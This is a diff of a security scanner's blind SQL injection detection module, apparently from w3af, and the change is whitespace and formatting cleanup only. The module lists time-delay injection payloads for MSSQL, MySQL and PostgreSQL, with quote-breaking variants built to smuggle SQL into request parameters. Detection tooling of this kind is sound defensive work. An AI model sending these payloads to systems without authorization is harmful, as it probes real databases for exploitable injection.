@@ -30,71 +30,71 @@ from core.controllers.delay_detection.delay import delay
 class blind_sqli_time_delay(object):
     '''
     This class tests for blind SQL injection bugs using time delays, the logic
-    is here and not as an audit plugin because this logic is also used in 
+    is here and not as an audit plugin because this logic is also used in
     attack plugins.
-    
+
     @author: Andres Riancho (andres.riancho@gmail.com)
     '''
 
     def __init__(self, uri_opener):
         self._uri_opener = uri_opener
-        
-    def is_injectable( self, mutant ):
+
+    def is_injectable(self, mutant):
         '''
         Check if this mutant is delay injectable or not.
-        
+
         @mutant: The mutant object that I have to inject to
         @return: A vulnerability object or None if nothing is found
         '''
         for delay_obj in self._get_delays():
-            
+
             ed = exact_delay(mutant, delay_obj, self._uri_opener)
             success, responses = ed.delay_is_controlled()
-            
+
             if success:
                 # Now I can be sure that I found a vuln, we control the response
                 # time with the delay
-                v = vuln.vuln( mutant )
-                v.set_name( 'Blind SQL injection vulnerability' )
+                v = vuln.vuln(mutant)
+                v.set_name('Blind SQL injection vulnerability')
                 v.set_severity(severity.HIGH)
                 desc = 'Blind SQL injection using time delays was found at: %s'
                 desc = desc % mutant.found_at()
-                v.set_desc( desc )
-                v.set_dc( mutant.get_dc() )
-                v.set_id( [r.id for r in responses ] )
-                v.setURI( r.getURI() )
-                
-                om.out.debug( v.get_desc() )
-    
+                v.set_desc(desc)
+                v.set_dc(mutant.get_dc())
+                v.set_id([r.id for r in responses])
+                v.setURI(r.getURI())
+
+                om.out.debug(v.get_desc())
+
                 return v
-                
+
         return None
-    
-    def _get_delays( self ):
+
+    def _get_delays(self):
         '''
         @return: A list of statements that are going to be used to test for
                  blind SQL injections. The statements are objects.
         '''
         res = []
-        
+
         # MSSQL
-        res.append( delay("1;waitfor delay '0:0:%s'--") )
-        res.append( delay("1);waitfor delay '0:0:%s'--") )
-        res.append( delay("1));waitfor delay '0:0:%s'--") )
-        res.append( delay("1';waitfor delay '0:0:%s'--") )
-        res.append( delay("1');waitfor delay '0:0:%s'--") )
-        res.append( delay("1'));waitfor delay '0:0:%s'--") )
+        res.append(delay("1;waitfor delay '0:0:%s'--"))
+        res.append(delay("1);waitfor delay '0:0:%s'--"))
+        res.append(delay("1));waitfor delay '0:0:%s'--"))
+        res.append(delay("1';waitfor delay '0:0:%s'--"))
+        res.append(delay("1');waitfor delay '0:0:%s'--"))
+        res.append(delay("1'));waitfor delay '0:0:%s'--"))
 
         # MySQL 5
         #
         # Thank you guys for adding sleep(seconds) !
         #
-        res.append( delay("1 or SLEEP(%s)") )
-        res.append( delay("1' or SLEEP(%s) and '1'='1") )
-        res.append( delay('1" or SLEEP(%s) and "1"="1') )
-        
+        res.append(delay("1 or SLEEP(%s)"))
+        res.append(delay("1' or SLEEP(%s) and '1'='1"))
+        res.append(delay('1" or SLEEP(%s) and "1"="1'))
+
         # MySQL 4
-        # 
+        #
         # MySQL 4 doesn't have a sleep function, so I have to use BENCHMARK(1000000000,MD5(1))
         # but the benchmarking will delay the response a different amount of time in each computer
         # which sucks because I use the time delay to check!
@@ -106,21 +106,20 @@ class blind_sqli_time_delay(object):
         #
         # With a small wait time of 5 seconds, this should work without problems...
         # and without hitting the xUrllib timeout !
-        # 
+        #
         #    TODO: Need to implement variable_delay.py (modification of exact_delay)
         #          and use the following there:
         #
         #res.append( delay("1 or BENCHMARK(2500000,MD5(1))") )
         #res.append( delay("1' or BENCHMARK(2500000,MD5(1)) or '1'='1") )
         #res.append( delay('1" or BENCHMARK(2500000,MD5(1)) or "1"="1') )
-              
+
         # PostgreSQL
-        res.append( delay("1 or pg_sleep(%s)") )
-        res.append( delay("1' or pg_sleep(%s) and '1'='1") )
-        res.append( delay('1" or pg_sleep(%s) and "1"="1') )
-        
+        res.append(delay("1 or pg_sleep(%s)"))
+        res.append(delay("1' or pg_sleep(%s) and '1'='1"))
+        res.append(delay('1" or pg_sleep(%s) and "1"="1'))
+
         # TODO: Add Oracle support
         # TODO: Add XXXXX support
-        
-        return res
 
+        return res
